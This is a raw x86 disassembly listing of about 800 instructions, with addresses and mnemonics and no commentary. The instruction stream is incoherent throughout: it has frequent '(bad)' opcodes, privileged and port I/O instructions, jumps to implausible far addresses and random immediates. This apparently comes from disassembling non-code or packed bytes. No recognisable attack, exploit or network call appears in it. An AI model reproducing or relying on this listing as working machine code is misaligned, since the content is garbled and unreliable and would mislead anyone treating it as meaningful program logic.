  4157dd:	mov    ds:0x7560cb88,al
  4157e2:	and    edx,eax
  4157e4:	mov    eax,ds:0xb947c677
  4157e9:	sbb    dl,BYTE PTR [ebp-0x3c]
  4157ec:	sbb    edx,ecx
  4157ee:	cwde   
  4157ef:	mov    ds:0xe51248a,al
  4157f4:	ret    
  4157f5:	loope  0x4157bf
  4157f7:	push   edi
  4157f8:	hlt    
  4157f9:	imul   DWORD PTR [ecx+0x4a]
  4157fc:	xor    DWORD PTR [edi-0x27],esp
  4157ff:	jg     0x41579b
  415801:	imul   edi,DWORD PTR [edx-0x9078e8],0x4f753370
  41580b:	ret    
  41580c:	ins    DWORD PTR es:[edi],dx
  41580d:	xchg   DWORD PTR [edx-0x6fa9a332],edx
  415813:	test   BYTE PTR [esp-0x55c1a3a2],dh
  41581a:	cld    
  41581b:	sbb    BYTE PTR [edx+0x71],ch
  41581e:	inc    ebp
  41581f:	or     BYTE PTR [ebx],ch
  415821:	jmp    0x485cc88d
  415826:	jae    0x4158a4
  415828:	sub    cl,BYTE PTR [ebx+0x46ff49f1]
  41582e:	jns    0x415832
  415830:	rcr    edi,0x3a
  415833:	mov    WORD PTR [edx+0x6b],gs
  415836:	sbb    ch,BYTE PTR [edx]
  415838:	rcl    bl,1
  41583a:	je     0x41582d
  41583c:	add    eax,0x9664bb10
  415841:	sub    BYTE PTR [edx],ch
  415843:	hlt    
  415844:	and    ecx,DWORD PTR [ecx+0x0]
  415847:	cmp    BYTE PTR [ecx],al
  415849:	fidivr DWORD PTR [edi+eax*1-0x664b2a32]
  415850:	mov    di,0x9a6c
  415854:	dec    ebp
  415855:	(bad)  
  415856:	cld    
  415857:	mov    al,0xf3
  415859:	(bad)  
  41585a:	adc    esi,DWORD PTR [ebp+0x60]
  41585d:	aas    
  41585e:	fidivr WORD PTR [edi]
  415860:	imul   esi,edi,0xd872267d
  415866:	xchg   ebp,eax
  415867:	jge    0x4158b4
  415869:	scas   eax,DWORD PTR es:[edi]
  41586a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41586b:	mov    bl,0xb9
  41586d:	sub    esi,DWORD PTR ds:0x1ec45d4f
  415873:	add    eax,0x29dad2ae
  415878:	xchg   ecx,eax
  415879:	fucomi st,st(2)
  41587b:	(bad)  [edx+eax*4]
  41587e:	or     al,0x25
  415880:	gs cdq 
  415882:	hlt    
  415883:	bound  esi,QWORD PTR [edx-0x12]
  415886:	ret    
  415887:	pop    ds
  415888:	jo     0x415831
  41588a:	fwait
  41588b:	inc    eax
  41588c:	sbb    DWORD PTR [ebp+0x8b40fe2],ebx
  415892:	in     eax,0xd5
  415894:	and    esp,0x6f0f8785
  41589a:	mov    al,0x8
  41589c:	rcl    DWORD PTR [eax+0x79],1
  41589f:	nop
  4158a0:	mov    esi,0x320a42f7
  4158a5:	in     al,dx
  4158a6:	jg     0x4158e3
  4158a8:	mov    al,0xac
  4158aa:	push   ds
  4158ab:	fisttp DWORD PTR [eax]
  4158ad:	fs pop ebp
  4158af:	loope  0x41588c
  4158b1:	ret    0x7b
  4158b4:	and    eax,DWORD PTR [ebx+0x2d5baae5]
  4158ba:	cmp    BYTE PTR ds:0xbfc5d93f,0x2a
  4158c1:	icebp  
  4158c2:	daa    
  4158c3:	fs cdq 
  4158c5:	and    eax,DWORD PTR [edx]
  4158c7:	ret    
  4158c8:	cld    
  4158c9:	xchg   esp,eax
  4158ca:	inc    ecx
  4158cb:	retf   
  4158cc:	pop    ecx
  4158cd:	aaa    
  4158ce:	sbb    ah,dl
  4158d0:	sbb    BYTE PTR gs:[ebx+0x770a83c3],cl
  4158d7:	retf   
  4158d8:	pop    ecx
  4158d9:	int3   
  4158da:	gs jp  0x415891
  4158dd:	pop    ds
  4158de:	xchg   ebp,edx
  4158e0:	push   cs
  4158e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158e2:	add    BYTE PTR cs:[eax],ah
  4158e5:	lods   eax,DWORD PTR ds:[esi]
  4158e6:	mov    bh,0x9
  4158e8:	xchg   esp,eax
  4158e9:	cmp    esi,DWORD PTR [ebx]
  4158eb:	clc    
  4158ec:	ins    DWORD PTR es:[edi],dx
  4158ed:	push   ebp
  4158ee:	fsub   st,st(4)
  4158f0:	and    DWORD PTR [ecx+0xc5822],ecx
  4158f6:	or     ah,bh
  4158f8:	scas   al,BYTE PTR es:[edi]
  4158f9:	push   0xad1fd867
  4158fe:	pop    ebp
  4158ff:	ret    
  415900:	pop    esi
  415901:	in     al,dx
  415902:	push   edi
  415903:	xchg   esp,eax
  415904:	dec    ebx
  415905:	ret    
  415906:	lock jge 0x4158f7
  415909:	pop    eax
  41590a:	mov    WORD PTR [esi+0x9],fs
  41590d:	fcom   DWORD PTR [ebx+eiz*1]
  415910:	sti    
  415911:	shl    BYTE PTR [edx-0x3278df74],0xe1
  415918:	or     DWORD PTR [eax],0xb5dd6727
  41591e:	inc    edx
  41591f:	mov    WORD PTR [eax],cs
  415921:	aas    
  415922:	(bad)  
  415923:	push   cs
  415924:	(bad)  
  415925:	mov    al,0xab
  415927:	popf   
  415928:	or     ebp,DWORD PTR [ebp-0x79]
  41592b:	xor    DWORD PTR [esi-0x34],ebx
  41592e:	test   eax,0xb3d6624a
  415933:	in     al,dx
  415934:	jp     0x415949
  415936:	mov    esi,0xdcc550b0
  41593b:	or     eax,0x178ace20
  415940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415941:	and    eax,DWORD PTR [ebx-0x4b]
  415944:	in     al,0xd1
  415946:	jnp    0x4158fe
  415948:	sbb    al,0x57
  41594a:	mov    edi,0x82de9012
  41594f:	cdq    
  415950:	in     al,0xbe
  415952:	inc    eax
  415953:	mov    ebp,0xfd734dd4
  415958:	ror    esp,0x50
  41595b:	and    DWORD PTR [ebp+0x45d9339c],0xffffffbe
  415962:	lea    edx,[ecx+0x7787e214]
  415968:	xor    eax,DWORD PTR [eax+edx*8]
  41596b:	mov    ch,0xb2
  41596d:	int3   
  41596e:	sub    edx,DWORD PTR [eax+0x71ddec70]
  415974:	jge    0x415983
  415976:	into   
  415977:	pop    ebx
  415978:	sbb    eax,0x9faa40a4
  41597d:	mov    ds:0xffb5d4a7,eax
  415982:	mov    ds:0x22c431f1,al
  415987:	adc    eax,0xcbb4e897
  41598c:	ret    0x82a7
  41598f:	loope  0x415943
  415991:	rol    DWORD PTR [ebp+0x68],cl
  415994:	jo     0x415938
  415996:	pop    eax
  415997:	mov    esp,0x4e3366f
  41599c:	rcl    BYTE PTR [esi-0x187102d4],cl
  4159a2:	ror    DWORD PTR [ecx+0x2e],cl
  4159a5:	call   0x6085d72a
  4159aa:	jg     0x415a19
  4159ac:	cmc    
  4159ad:	cmp    eax,0x1083f76e
  4159b2:	adc    BYTE PTR [ebp+edi*4-0x2094c351],dh
  4159b9:	and    eax,0xf21b2bb
  4159be:	test   BYTE PTR [edi-0x61cdf08],ah
  4159c4:	fldz   
  4159c6:	mov    ch,0xd
  4159c8:	call   0x2b63f9a5
  4159cd:	sub    BYTE PTR [ebp+edx*2-0x5c],dh
  4159d1:	adc    eax,0x1d2a633e
  4159d6:	push   ebx
  4159d7:	lahf   
  4159d8:	mov    eax,0x8eb26d3
  4159dd:	sbb    ch,BYTE PTR [eax-0x3a]
  4159e0:	pop    es
  4159e1:	inc    edi
  4159e2:	pop    ecx
  4159e3:	adc    esp,esp
  4159e5:	mov    WORD PTR [esi],?
  4159e7:	int    0x35
  4159e9:	jae    0x4159c0
  4159eb:	ret    0x2480
  4159ee:	imul   ebx,DWORD PTR [esp+ebx*2-0x154216a8],0x7055a35d
  4159f9:	lahf   
  4159fa:	inc    eax
  4159fb:	shl    BYTE PTR [edx+ecx*2-0x8],0xdb
  415a00:	xor    ebx,eax
  415a02:	call   0x1fcefe3c
  415a07:	pop    eax
  415a08:	dec    ebx
  415a09:	sbb    al,BYTE PTR [ebx]
  415a0b:	dec    esp
  415a0c:	adc    DWORD PTR [ecx],ecx
  415a0e:	daa    
  415a0f:	test   al,0x93
  415a11:	out    dx,eax
  415a12:	jmp    0x763b6b37
  415a17:	add    DWORD PTR [ebx],ecx
  415a19:	dec    ecx
  415a1a:	or     esp,ecx
  415a1c:	pop    edx
  415a1d:	int3   
  415a1e:	imul   edi,DWORD PTR [edi+0x74e7a896],0x8f0f0526
  415a28:	cmp    DWORD PTR [edi+0x73],ebp
  415a2b:	xchg   ebx,eax
  415a2c:	lods   eax,DWORD PTR ds:[esi]
  415a2d:	and    eax,0x79fc542a
  415a32:	push   ss
  415a33:	sbb    eax,DWORD PTR [esi]
  415a35:	out    dx,eax
  415a36:	pop    esi
  415a37:	stos   DWORD PTR es:[edi],eax
  415a38:	(bad)  
  415a39:	xor    eax,0x55abcf70
  415a3e:	add    dl,BYTE PTR [esi+0x45abafb6]
  415a44:	xor    al,0x55
  415a46:	xor    al,0x3
  415a48:	mov    ebp,0x9c5d54fd
  415a4d:	sub    DWORD PTR [ecx-0x19],esp
  415a50:	mov    cl,0x9
  415a52:	retf   0x6f76
  415a55:	pop    esi
  415a56:	cdq    
  415a57:	fwait
  415a58:	add    eax,0x697fe24e
  415a5d:	mov    al,0xa
  415a5f:	inc    ebp
  415a60:	mov    ds:0x6f34b000,eax
  415a65:	add    al,0xda
  415a67:	xchg   esi,eax
  415a68:	add    al,0xec
  415a6a:	ja     0x415a0d
  415a6c:	add    ebx,DWORD PTR [edi-0x49]
  415a6f:	pop    ss
  415a70:	mul    BYTE PTR [ecx+0x6a07b978]
  415a76:	sti    
  415a77:	push   es
  415a78:	push   esp
  415a79:	shl    DWORD PTR [ecx-0x3b373afe],0xf9
  415a80:	test   dl,0x53
  415a83:	sti    
  415a84:	inc    ebx
  415a85:	sub    BYTE PTR [eax],ch
  415a87:	test   al,0xf1
  415a89:	sbb    al,0x33
  415a8b:	ror    DWORD PTR [ebp+0x729c0284],1
  415a91:	xor    al,BYTE PTR [eax]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	sbb    DWORD PTR [ebp+0x24],edi
  415aa7:	xchg   DWORD PTR [eax-0x468f80f3],edi
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415a3d
  415ab1:	xor    ebx,DWORD PTR [ebp+0x54]
  415ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ab5:	vprotb xmm13,[ebp-0x25],xmm7
  415abb:	inc    ebx
  415abc:	add    al,0x51
  415abe:	adc    BYTE PTR [esi-0x92253fc],dh
  415ac4:	push   ebp
  415ac5:	xchg   esi,eax
  415ac6:	ficom  WORD PTR [ebx-0x72]
  415ac9:	adc    esi,DWORD PTR [ebp+0x2eaf0bef]
  415acf:	scas   eax,DWORD PTR es:[edi]
  415ad0:	jns    0x415a7f
  415ad2:	imul   esp,DWORD PTR [ebx+0x76505923],0x46
  415ad9:	and    BYTE PTR ds:0xd362df64,al
  415adf:	scas   al,BYTE PTR es:[edi]
  415ae0:	int3   
  415ae1:	adc    DWORD PTR [edx],0xa6ed0048
  415ae7:	xchg   esp,eax
  415ae8:	std    
  415ae9:	pop    es
  415aea:	loope  0x415b35
  415aec:	shl    BYTE PTR [eax-0x6926483d],cl
  415af2:	mov    ebx,0xdd50c8dd
  415af7:	jb     0x415ac1
  415af9:	sub    al,0x2c
  415afb:	xor    cl,ch
  415afd:	es push 0x11
  415b00:	ins    BYTE PTR es:[edi],dx
  415b01:	pop    ecx
  415b02:	xchg   esp,eax
  415b03:	out    0x45,eax
  415b05:	mov    ch,0x3c
  415b07:	(bad)  
  415b09:	add    ebp,DWORD PTR [ebx+0x8]
  415b0c:	test   BYTE PTR [eax+0x504a2efc],dl
  415b12:	lock sub DWORD PTR [edx-0x5d28bf84],edi
  415b19:	shl    BYTE PTR [esi+0x5d1a30fa],0xcb
  415b20:	stos   DWORD PTR es:[edi],eax
  415b21:	sub    eax,0x62d45a12
  415b26:	ffree  st(1)
  415b28:	test   al,0x7b
  415b2a:	add    eax,0x4b49649a
  415b2f:	bnd jp 0x415b7a
  415b32:	sbb    BYTE PTR [edi-0x2e4368d7],ch
  415b38:	xor    ebp,DWORD PTR [edi-0xaf1efc2]
  415b3e:	pop    edi
  415b3f:	ret    
  415b40:	adc    eax,0x25aa540
  415b45:	push   ds
  415b46:	enter  0x96ca,0x40
  415b4a:	inc    ebp
  415b4b:	xchg   ebp,eax
  415b4c:	dec    eax
  415b4d:	aaa    
  415b4e:	and    al,0x82
  415b50:	data16 mov dl,0x22
  415b53:	mov    bh,0xc0
  415b55:	xor    al,0xf3
  415b57:	out    dx,al
  415b58:	mul    BYTE PTR [ebx]
  415b5a:	or     eax,0x1a4628e5
  415b5f:	sub    eax,0x1a7da91f
  415b64:	pop    ds
  415b65:	daa    
  415b66:	dec    edx
  415b67:	ficom  DWORD PTR ds:0x3330af8c
  415b6d:	cmp    edi,DWORD PTR [eax+0x14dfd0df]
  415b73:	out    dx,al
  415b74:	data16 test al,0xb9
  415b77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b78:	xchg   ecx,eax
  415b79:	jb     0x415b3c
  415b7b:	neg    BYTE PTR [esi+0x3d]
  415b7e:	xchg   esi,eax
  415b7f:	cmp    eax,ecx
  415b81:	mov    esp,esp
  415b83:	mov    edx,0x1986886a
  415b88:	ret    
  415b89:	ret    
  415b8a:	sbb    al,0x39
  415b8c:	dec    DWORD PTR [edi+ebp*8+0x33]
  415b90:	add    DWORD PTR [ebx+0x1c03b0ed],0xffffffb8
  415b97:	xor    ebp,DWORD PTR [ecx]
  415b99:	or     bh,BYTE PTR [edx]
  415b9b:	cli    
  415b9c:	xchg   esp,eax
  415b9d:	enter  0xf060,0xc5
  415ba1:	sbb    al,0x33
  415ba3:	(bad)  
  415ba4:	std    
  415ba5:	dec    eax
  415ba6:	aas    
  415ba7:	lea    ebp,[ebp-0x7216deab]
  415bad:	jb     0x415c0d
  415baf:	or     BYTE PTR [esi+0x3c],ah
  415bb2:	jg     0x415c11
  415bb4:	push   0x6b
  415bb6:	mov    ah,0xb2
  415bb8:	lds    esi,FWORD PTR [ebp-0x2288ac75]
  415bbe:	cmp    DWORD PTR [ecx],ebp
  415bc0:	adc    DWORD PTR [edi+0x32],esi
  415bc3:	arpl   di,bx
  415bc5:	imul   ecx,DWORD PTR [ecx+esi*2+0x55],0x7e
  415bca:	inc    ecx
  415bcb:	idiv   DWORD PTR [ecx+eax*2-0x68]
  415bcf:	(bad)  
  415bd0:	out    dx,eax
  415bd1:	cld    
  415bd2:	xchg   BYTE PTR [edi+ebx*8],bh
  415bd5:	lahf   
  415bd6:	fcomi  st,st(3)
  415bd8:	loopne 0x415bf0
  415bda:	hlt    
  415bdb:	pop    edi
  415bdc:	mov    edi,0xda33fb86
  415be1:	jae    0x415bde
  415be3:	push   0x557480fe
  415be8:	daa    
  415be9:	hlt    
  415bea:	xchg   esp,eax
  415beb:	jp     0x415c69
  415bed:	pop    ss
  415bee:	dec    esi
  415bef:	test   bl,bl
  415bf1:	push   esp
  415bf2:	(bad)  
  415bf3:	jo     0x415bc2
  415bf5:	add    esi,edi
  415bf7:	xlat   BYTE PTR ds:[ebx]
  415bf8:	test   al,0x60
  415bfa:	out    dx,al
  415bfb:	js     0x415c01
  415bfd:	push   0x8cb5b777
  415c02:	stos   DWORD PTR es:[edi],eax
  415c03:	mov    ebp,0x440a5ff9
  415c08:	pop    ebp
  415c09:	sbb    eax,0xd808e331
  415c0e:	dec    eax
  415c0f:	jg     0x415c46
  415c11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c12:	int    0xf5
  415c14:	es jno 0x415c8d
  415c17:	push   cs
  415c18:	rcr    BYTE PTR [ebx],0x7f
  415c1b:	in     al,dx
  415c1c:	xlat   BYTE PTR ds:[ebx]
  415c1d:	sub    dl,BYTE PTR [esi+0x7c]
  415c20:	fisttp WORD PTR [edx]
  415c22:	and    ecx,eax
  415c24:	sbb    dh,BYTE PTR [ecx+0x48]
  415c27:	pop    ecx
  415c28:	cmp    eax,0x2c776e84
  415c2d:	jecxz  0x415c51
  415c2f:	fs inc esi
  415c31:	mov    al,0x64
  415c33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c34:	call   0x80e2912c
  415c39:	mov    ebp,0x2911ff02
  415c3e:	and    BYTE PTR fs:[edi],bh
  415c41:	jo     0x415c1a
  415c43:	jno    0x415c67
  415c45:	add    BYTE PTR [eax-0x7c6328b6],ch
  415c4b:	jle    0x415c11
  415c4d:	pop    ebx
  415c4e:	(bad)  
  415c4f:	icebp  
  415c50:	repnz push ds
  415c52:	dec    esi
  415c53:	inc    esi
  415c54:	loopne 0x415cbc
  415c56:	jb     0x415c0a
  415c58:	push   ds
  415c59:	in     al,0x59
  415c5b:	ins    BYTE PTR es:[edi],dx
  415c5c:	(bad)  
  415c5d:	stos   BYTE PTR es:[edi],al
  415c5e:	pop    ss
  415c5f:	inc    ebx
  415c60:	nop
  415c61:	sub    al,0x5f
  415c63:	sbb    al,0x83
  415c65:	aam    0x5
  415c67:	pop    ecx
  415c68:	dec    esi
  415c69:	inc    edx
  415c6a:	in     eax,0x88
  415c6c:	ins    DWORD PTR es:[edi],dx
  415c6d:	jle    0x415c0e
  415c6f:	cmp    al,0x70
  415c71:	sti    
  415c72:	lea    esi,[edx]
  415c74:	aas    
  415c75:	rol    DWORD PTR [edi+edi*2],cl
  415c78:	fidiv  DWORD PTR [edx+0x7152242d]
  415c7e:	and    BYTE PTR [edx-0x799d25c4],bh
  415c84:	outs   dx,BYTE PTR ds:[esi]
  415c85:	pop    ss
  415c86:	sub    ch,BYTE PTR ds:0x13e91253
  415c8c:	ds stos DWORD PTR es:[edi],eax
  415c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c8f:	ins    BYTE PTR es:[edi],dx
  415c90:	pop    es
  415c91:	sub    BYTE PTR [esi+0x1e91b31a],dl
  415c97:	cli    
  415c98:	lods   eax,DWORD PTR ds:[esi]
  415c99:	mov    eax,0x89b33629
  415c9e:	inc    ecx
  415c9f:	icebp  
  415ca0:	jne    0x415d11
  415ca2:	div    DWORD PTR [edi]
  415ca4:	(bad)  
  415ca5:	cdq    
  415ca6:	popa   
  415ca7:	adc    eax,0x4dc0488d
  415cac:	cs jbe 0x415c7b
  415caf:	xor    ebp,DWORD PTR [edx+0x3e092cf4]
  415cb5:	sub    bl,BYTE PTR [ebx-0x18c4cbf9]
  415cbb:	xchg   edx,eax
  415cbc:	je     0x415c43
  415cbe:	xlat   BYTE PTR ds:[ebx]
  415cbf:	fs push 0x22
  415cc2:	cmp    al,0xe8
  415cc4:	mov    ah,0x9b
  415cc6:	stos   BYTE PTR es:[edi],al
  415cc7:	pop    esp
  415cc8:	mov    bh,0x99
  415cca:	(bad)  
  415ccb:	inc    ah
  415ccd:	dec    eax
  415cce:	lds    edx,FWORD PTR [ebp-0x6dfb3428]
  415cd4:	pop    ds
  415cd5:	repz jle 0x415d4f
  415cd8:	xchg   ebx,eax
  415cd9:	gs xor dh,BYTE PTR gs:[edx+0x48]
  415cde:	in     eax,0x6e
  415ce0:	sub    DWORD PTR [eax],ecx
  415ce2:	cmp    DWORD PTR [esi-0x4f],ebp
  415ce5:	push   es
  415ce6:	sbb    BYTE PTR [edx+0x41],dl
  415ce9:	push   esp
  415cea:	in     al,0x3
  415cec:	adc    al,0xbf
  415cee:	pusha  
  415cef:	clc    
  415cf0:	hlt    
  415cf1:	push   ebp
  415cf2:	xchg   edi,ebp
  415cf4:	scas   al,BYTE PTR es:[edi]
  415cf5:	jo     0x415d03
  415cf7:	or     ah,dl
  415cf9:	adc    al,BYTE PTR [edx+edx*1]
  415cfc:	pop    ss
  415cfd:	(bad)  
  415cfe:	punpckhdq mm1,QWORD PTR [edx+0x5e7a079b]
  415d05:	inc    ebp
  415d06:	(bad)  
  415d08:	je     0x415cf5
  415d0a:	mov    dl,0x53
  415d0c:	push   ebx
  415d0d:	in     al,0x36
  415d0f:	sub    eax,0x364ebcf2
  415d14:	jl     0x415d15
  415d16:	fldcw  WORD PTR ds:[esi+0x6b817e21]
  415d1d:	sub    bh,BYTE PTR [ebx+0x2f61776]
  415d23:	mov    bl,0xb9
  415d25:	cmp    BYTE PTR [edi-0x74],al
  415d28:	lods   eax,DWORD PTR ds:[esi]
  415d29:	xchg   ebx,eax
  415d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d2b:	push   ds
  415d2c:	icebp  
  415d2d:	mov    al,ds:0x13c2930a
  415d32:	push   esi
  415d33:	push   ss
  415d34:	push   esp
  415d35:	xor    ecx,ebp
  415d37:	or     BYTE PTR [eax+0x1ee058e],cl
  415d3d:	scas   eax,DWORD PTR es:[edi]
  415d3e:	inc    ebp
  415d3f:	jle    0x415dbe
  415d41:	pop    edx
  415d42:	mov    al,ds:0xfcfdf18a
  415d47:	push   cs
  415d48:	sbb    eax,0xfd91723a
  415d4d:	out    0xdb,al
  415d4f:	in     al,dx
  415d50:	or     DWORD PTR [edx-0x45],eax
  415d53:	add    al,0x6d
  415d55:	or     bh,BYTE PTR [edx+0x5ac30edc]
  415d5b:	daa    
  415d5c:	iret   
  415d5d:	hlt    
  415d5e:	(bad)  
  415d60:	(bad)  
  415d62:	pop    edi
  415d63:	lds    eax,FWORD PTR [ebx+0x2f]
  415d66:	jb     0x415d33
  415d68:	adc    BYTE PTR [edx-0x49],0x75
  415d6c:	rcr    DWORD PTR [ebx*4+0x2d2b0d90],0x87
  415d74:	adc    esi,ebx
  415d76:	mov    esi,0x8b08558b
  415d7b:	jge    0x415d59
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	mov    ecx,0x814eba14
  415d99:	or     bh,BYTE PTR [edi+0x70]
  415d9c:	mov    ecx,0x8f70707e
  415da1:	pop    esi
  415da2:	sub    bl,BYTE PTR fs:[edx]
  415da5:	ficomp WORD PTR [ebx]
  415da7:	sbb    al,0x86
  415da9:	add    BYTE PTR [edi+edx*4-0x26844b61],ah
  415db0:	sub    al,0x82
  415db2:	mov    ah,0x1a
  415db4:	or     eax,0x7c4f9e69
  415db9:	add    ebx,ebp
  415dbb:	inc    ecx
  415dbc:	sbb    eax,0x9ff02600
  415dc1:	dec    ebx
  415dc2:	mov    esi,0x806edced
  415dc7:	test   eax,0x9046cc01
  415dcc:	int    0xb0
  415dce:	ror    BYTE PTR [edx-0x2e],cl
  415dd1:	dec    ebx
  415dd2:	lds    esi,FWORD PTR [edi-0x2bea24f]
  415dd8:	xchg   edi,eax
  415dd9:	fsub   DWORD PTR [edi]
  415ddb:	lea    eax,[edi+0x4f]
  415dde:	jae    0x415e56
  415de0:	pushf  
  415de1:	push   edi
  415de2:	xchg   DWORD PTR [eax],ebx
  415de4:	arpl   WORD PTR [ecx],bp
  415de6:	sub    DWORD PTR [edi-0x1b],eax
  415de9:	mov    bl,0x96
  415deb:	sbb    ch,BYTE PTR [ebx]
  415ded:	or     ah,BYTE PTR [edi]
  415def:	call   0xf637dbe2
  415df4:	push   ebp
  415df5:	sub    BYTE PTR [edi+0x14ecbf14],ah
  415dfb:	test   al,0xc3
  415dfd:	div    dh
  415dff:	lods   eax,DWORD PTR ds:[esi]
  415e00:	pop    eax
  415e01:	mov    esp,0x439b3a1c
  415e06:	ror    BYTE PTR [ecx-0x53bdccb8],1
  415e0c:	mov    eax,ds:0x20823cbb
  415e11:	dec    eax
  415e12:	sar    BYTE PTR [edi],1
  415e14:	adc    bh,dl
  415e16:	ds mov al,0x92
  415e19:	push   0xae01f5c8
  415e1e:	push   ebx
  415e1f:	imul   esp,ebx,0xffffffeb
  415e22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e23:	inc    ebp
  415e24:	or     al,0xe6
  415e26:	add    al,0x56
  415e28:	js     0x415df2
  415e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e2b:	cmp    al,0x3e
  415e2d:	popa   
  415e2e:	sub    al,0x2b
  415e30:	iret   
  415e31:	xor    edi,esp
  415e33:	mov    BYTE PTR ds:0xdbe22341,bl
  415e39:	push   cs
  415e3a:	movzx  ebx,WORD PTR [esi]
  415e3d:	adc    DWORD PTR [eax-0x5f],esp
  415e40:	jl     0x415ead
  415e42:	retf   
  415e43:	or     ecx,DWORD PTR ds:0x61d8ec1c
  415e49:	jl     0x415e69
  415e4b:	adc    dh,dl
  415e4d:	retf   0xd126
  415e50:	jl     0x415e6b
  415e52:	pop    ebx
  415e53:	nop
  415e54:	lods   al,BYTE PTR ds:[esi]
  415e55:	or     DWORD PTR [ebp+0x5cf7113],0xffffff94
  415e5c:	mov    ah,0x94
  415e5e:	push   cs
  415e5f:	add    BYTE PTR [ebx],al
  415e61:	pop    ss
  415e62:	lahf   
  415e63:	mov    esp,0x979cc7b8
  415e68:	ss mov dh,0xfb
  415e6b:	xchg   edx,eax
  415e6c:	pop    ebx
  415e6d:	gs hlt 
  415e6f:	add    ebp,ebx
  415e71:	adc    ecx,ebp
  415e73:	push   esi
  415e74:	mov    dh,0x51
  415e76:	mov    ds:0xe96d0be0,al
  415e7b:	ror    al,cl
  415e7d:	mov    BYTE PTR [ebx-0x3a29d311],dl
  415e83:	neg    BYTE PTR [eax-0x6c]
  415e86:	fisubr WORD PTR [ebp+0x74]
  415e89:	imul   eax,esp,0xd534199
  415e8f:	test   eax,0xf2aec87
  415e94:	and    dh,al
  415e96:	call   0x14f4f724
  415e9b:	push   edx
  415e9c:	push   ebp
  415e9d:	xor    BYTE PTR [edx+0xac96a1f],al
  415ea3:	outs   dx,BYTE PTR ds:[esi]
  415ea4:	inc    esp
  415ea5:	mov    edx,0x1ad0f1d0
  415eaa:	lods   eax,DWORD PTR ds:[esi]
  415eab:	push   esi
  415eac:	sbb    eax,0x974ebefa
  415eb1:	pop    ss
  415eb2:	in     eax,0xd2
  415eb4:	aam    0x83
  415eb6:	mov    ebx,0x2a8b06c2
  415ebb:	jge    0x415e4c
  415ebd:	ficomp DWORD PTR [esi]
  415ebf:	xchg   esi,eax
  415ec0:	push   ds
  415ec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ec2:	pop    ebx
  415ec3:	lock arpl WORD PTR [edx-0x6be1126f],ax
  415eca:	push   es
  415ecb:	jno    0x415f33
  415ecd:	iret   
  415ece:	ss sti 
  415ed0:	out    0x7c,al
  415ed2:	neg    al
  415ed4:	mov    eax,0xff0dd60d
  415ed9:	stos   DWORD PTR es:[edi],eax
  415eda:	aad    0x43
  415edc:	imul   ebx,DWORD PTR [edx+eax*8-0xe],0x27
  415ee1:	add    eax,0xc2079327
  415ee6:	xchg   edx,eax
  415ee7:	sar    BYTE PTR [eax-0x54],1
  415eea:	or     BYTE PTR [esi],ch
  415eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eed:	fs fwait
  415eef:	out    0x11,al
  415ef1:	call   0x12b756b1
  415ef6:	cwde   
  415ef7:	shl    DWORD PTR [edx+edi*8+0x44],0xf2
  415efc:	ror    BYTE PTR [eax-0x77],1
  415eff:	out    dx,eax
  415f00:	test   al,0x30
  415f02:	ret    0x64a
  415f05:	push   esi
  415f06:	into   
  415f07:	loopne 0x415f1e
  415f09:	test   BYTE PTR [eax+0x33],al
  415f0c:	sbb    BYTE PTR [esi+0x6590209e],dh
  415f12:	imul   ecx,DWORD PTR [edx],0xa106138c
  415f18:	mov    DWORD PTR [ecx+0x4d],esi
  415f1b:	loop   0x415f4a
  415f1d:	fadd   st(6),st
  415f1f:	cmp    eax,0x34904013
  415f24:	mov    ah,0xd7
  415f26:	mov    ebx,0x40993bb2
  415f2b:	inc    esi
  415f2c:	(bad)  
  415f2d:	xlat   BYTE PTR ds:[ebx]
  415f2e:	cmp    al,0xb3
  415f30:	dec    ecx
  415f31:	jns    0x415ee5
  415f33:	mov    BYTE PTR [edx+ecx*4+0x74b9cb1],dl
  415f3a:	inc    edi
  415f3b:	jge    0x415f4c
  415f3d:	lds    edx,FWORD PTR [ecx]
  415f3f:	cmp    al,0x8a
  415f41:	loopne 0x415f24
  415f43:	mov    WORD PTR [eax+0x7f],cs
  415f46:	jmp    0x5a84:0x28d7c053
  415f4d:	fwait
  415f4e:	popf   
  415f4f:	enter  0x1bcf,0xba
  415f53:	sub    BYTE PTR [edx-0x71],dh
  415f56:	leave  
  415f57:	daa    
  415f58:	sbb    edx,DWORD PTR [eax]
  415f5a:	inc    ebx
  415f5b:	(bad)  
  415f5c:	and    eax,0x1683c43f
  415f61:	loopne 0x415f6a
  415f63:	(bad)  
  415f64:	repnz ins BYTE PTR es:[edi],dx
  415f66:	lods   al,BYTE PTR ds:[esi]
  415f67:	jp     0x415fc2
  415f69:	dec    ebx
  415f6a:	pop    es
  415f6b:	cmp    eax,0xee7dea87
  415f70:	(bad)  
  415f72:	repnz and eax,0xcf42c825
  415f78:	inc    esp
  415f79:	daa    
  415f7a:	inc    ebp
  415f7b:	mov    ds,WORD PTR [esp+eiz*2-0x3116de5d]
  415f82:	xor    edi,DWORD PTR [ebx]
  415f84:	mov    dl,0xfb
  415f86:	sub    eax,0x1b393198
  415f8b:	mov    ecx,DWORD PTR [ebp+0x7d1be09a]
  415f91:	push   es
  415f92:	xchg   esi,eax
  415f93:	inc    ecx
  415f94:	aaa    
